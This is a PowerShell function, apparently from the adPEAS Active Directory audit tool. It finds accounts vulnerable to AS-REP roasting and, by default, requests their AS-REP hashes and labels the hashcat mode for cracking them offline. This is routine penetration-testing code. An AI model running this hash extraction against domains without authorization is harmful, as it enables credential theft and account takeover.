function Get-ASREPRoastableAccounts {
    <#
    .SYNOPSIS
    Detects user accounts vulnerable to AS-REP Roasting attacks.

    .DESCRIPTION
    Identifies user accounts with "Do not require Kerberos preauthentication" enabled (userAccountControl flag DONT_REQ_PREAUTH / 4194304).
    AS-REP Roasting allows attackers to request AS-REP responses without valid credentials, which can then be cracked offline to recover plaintext passwords.

    .PARAMETER Domain
    Target domain (optional, uses current domain if not specified)

    .PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

    .PARAMETER Credential
    PSCredential object for authentication (optional, uses current user if not specified)

    .PARAMETER OPSEC
    When enabled, skips active AS-REP hash extraction (Kerberos AS-REQ without pre-authentication).
    Detection of vulnerable accounts via LDAP query is always performed (passive).
    Use this in environments where Kerberos traffic is monitored.

    .EXAMPLE
    Get-ASREPRoastableAccounts

    .EXAMPLE
    Get-ASREPRoastableAccounts -Domain "contoso.com" -Credential (Get-Credential)

    .NOTES
    Category: Creds
    Author: Alexander Sturz (@_61106960_)
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$OPSEC
    )

    begin {
        Write-Log "[Get-ASREPRoastableAccounts] Starting AS-REP Roastable accounts check"
    }

    process {
        try {
            # Build connection parameters (exclude OPSEC which Ensure-LDAPConnection doesn't accept)
            $connectionParams = @{}
            if ($Domain) { $connectionParams['Domain'] = $Domain }
            if ($Server) { $connectionParams['Server'] = $Server }
            if ($Credential) { $connectionParams['Credential'] = $Credential }

            # Ensure LDAP connection (displays error if needed)
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                return
            }

            Show-SubHeader "Searching for AS-REP Roastable accounts (DONT_REQ_PREAUTH)..." -ObjectType "ASREPRoastable"

            # -Enabled for the same reason Get-KerberoastableAccounts uses it: a disabled
            # account cannot be roasted, the KDC answers KDC_ERR_CLIENT_REVOKED, and
            # reporting it is noise that hides the accounts an attacker can actually use.
            $asrepRoastableUsers = @(Get-DomainUser -PreauthNotRequired -Enabled -ShowOwner @connectionParams)

            # And the managed service accounts. objectCategory is single-valued and carries
            # the most specific class, so an MSA is neither (objectCategory=person) nor
            # (objectCategory=computer) and fell out of both base filters - while
            # DONT_REQUIRE_PREAUTH on an MSA is the same AS-REP roast as on any account.
            # Its password is 240 random bytes, which makes the hash impractical to crack
            # and the row a hint rather than a finding; that is a judgement for the row, not
            # a reason to leave the account out of a section whose secure line speaks for
            # the domain.
            $asrepRoastableMSAs = @(Get-DomainUser -GMSA -PreauthNotRequired -Enabled -ShowOwner @connectionParams)
            foreach ($msa in $asrepRoastableMSAs) {
                $msa | Add-Member -NotePropertyName 'accountKind' -NotePropertyValue 'Managed service account' -Force
            }
            $asrepRoastableUsers = @($asrepRoastableUsers) + @($asrepRoastableMSAs)

            if (@($asrepRoastableUsers).Count -gt 0) {
                Show-Line "Found $(@($asrepRoastableUsers).Count) AS-REP Roastable account(s):" -Class "Finding"

                # Determine if we should extract hashes (not in OPSEC mode)
                $canTestASREPRoast = -not $OPSEC

                if ($OPSEC) {
                    Show-Line "Skipping hash extraction (OPSEC mode)" -Class "Hint"
                }

                $totalUsers = @($asrepRoastableUsers).Count
                $currentIndex = 0
                $privilegedCount = 0
                foreach ($user in $asrepRoastableUsers) {
                    $currentIndex++
                    if ($totalUsers -gt $Script:ProgressThreshold) { Show-Progress -Activity "Analyzing AS-REP Roastable accounts" -Current $currentIndex -Total $totalUsers -ObjectName $user.sAMAccountName }
                    # If testing enabled, perform AS-REP Roast and add hash as attribute
                    if ($canTestASREPRoast) {
                        $testDomain = if ($Domain) { $Domain } else { $Script:LDAPContext.Domain }
                        $testDC = if ($Server) { $Server } else { $Script:LDAPContext.Server }

                        # Per-account try/catch, the same way Get-KerberoastableAccounts does
                        # it. Without it a single exception unwound into the check's outer
                        # catch: every account after the failing one was dropped and no
                        # closing line was printed, so a partial result looked complete.
                        $roastResult = $null
                        try {
                            $roastResult = Invoke-ASREPRoast -SAMAccountName $user.sAMAccountName -Domain $testDomain -DomainController $testDC
                        } catch {
                            Write-Log "[Get-ASREPRoastableAccounts] AS-REP roast failed for $($user.sAMAccountName): $_"
                            $user | Add-Member -NotePropertyName 'ASREPRoastError' -NotePropertyValue "Failed: $_" -Force
                        }

                        if ($null -eq $roastResult) { $roastResult = [PSCustomObject]@{ Success = $false; Hash = $null; Error = $null } }

                        if ($roastResult.Success -and $roastResult.Hash) {
                            # From the central table rather than a second copy here. This
                            # switch read 19600 for etype 17 and 19700 for etype 18, which
                            # are the TGS-REP modes: they cannot parse an AS-REP hash, and
                            # the reader got "Token length exception" from the mode the
                            # report told them to use. The default branch labelled every
                            # unknown etype, DES included, as 18200.
                            $hashcatMode = $null
                            if ($null -ne $roastResult.EncryptionType -and
                                $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey([int]$roastResult.EncryptionType)) {
                                $hashcatMode = $Script:KERBEROS_ENCRYPTION_TYPES[[int]$roastResult.EncryptionType].HashcatModeASREP
                            }

                            # Add hash info as attributes to the user object
                            $hashLabel = "Hashcat mode not available for $($roastResult.EncryptionTypeName) AS-REP - crack with a tool that reads this etype"
                            if ($null -ne $hashcatMode) {
                                $hashLabel = "Hashcat (mode $hashcatMode, $($roastResult.EncryptionTypeName))"
                            }
                            $user | Add-Member -NotePropertyName 'ASREPRoastingHash' -NotePropertyValue $roastResult.Hash -Force
                            $user | Add-Member -NotePropertyName 'ASREPRoastingHashType' -NotePropertyValue $hashLabel -Force
                            $user | Add-Member -NotePropertyName 'ASREPRoastEncryption' -NotePropertyValue $roastResult.EncryptionType -Force
                        }
                        elseif ($roastResult.Error) {
                            $user | Add-Member -NotePropertyName 'ASREPRoastError' -NotePropertyValue "Failed: $($roastResult.Error)" -Force
                        }
                    }

                    # Same reasoning as in Get-KerberoastableAccounts: the hash of a
                    # privileged account is worth incomparably more than that of a service
                    # account, and AS-REP roasting needs no credentials at all to obtain it.
                    $privileged = Test-IsPrivileged -Identity $user -IncludeOperators
                    if ($privileged -and $privileged.IsPrivileged) {
                        $privilegedCount++
                        $user | Add-Member -NotePropertyName 'PrivilegedRoastTarget' `
                            -NotePropertyValue $privileged.Reason -Force
                    }

                    $user | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'ASREPRoastable' -Force
                    Show-Object $user

                    # Blank line between accounts for readability
                    Show-EmptyLine
                }
                if ($totalUsers -gt $Script:ProgressThreshold) { Show-Progress -Activity "Analyzing AS-REP Roastable accounts" -Completed }

                if ($privilegedCount -gt 0) {
                    Show-Line "$privilegedCount of them is/are privileged - this hash needs no credentials at all to obtain" -Class "Finding"
                }
            } else {
                Show-Line "No AS-REP Roastable accounts found" -Class "Secure"
            }

        } catch {
            Write-Log "[Get-ASREPRoastableAccounts] Error: $_" -Level Error
        }
    }

    end {
        Write-Log "[Get-ASREPRoastableAccounts] Check completed"
    }
}
